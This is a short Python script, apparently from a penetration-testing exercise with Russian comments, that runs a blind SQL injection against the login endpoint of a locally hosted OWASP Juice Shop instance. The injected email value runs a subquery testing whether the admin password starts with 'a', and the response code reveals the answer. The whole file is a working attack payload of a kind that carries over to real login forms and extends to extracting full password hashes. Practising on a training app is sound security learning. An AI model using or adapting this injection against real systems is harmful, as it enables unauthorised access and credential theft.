#!/usr/bin/env python3
import requests
import json

with open("/home/alehandro/pentest/token.txt", "r") as f:
    user_token = f.read().strip()

headers = {
    "Authorization": f"Bearer {user_token}",
    "Content-Type": "application/json"
}

login_url = "http://localhost:3000/rest/user/login"

# Проверяем первый символ пароля админа
# SUBSTR(password, 1, 1) = 'a' — это наш вопрос базе
payload = "admin@juice-sh.op' AND SUBSTR((SELECT password FROM Users WHERE id=1), 1, 1) = 'a' --"

login_data = {
    "email": payload,
    "password": "test"
}

print("[*] Проверяю, начинается ли пароль админа с 'a'...")
response = requests.post(login_url, json=login_data, headers=headers)

if response.status_code == 200:
    print("[!] УСПЕХ! Пароль админа начинается с 'a'!")
else:
    print(f"[-] Нет. Код ответа: {response.status_code}")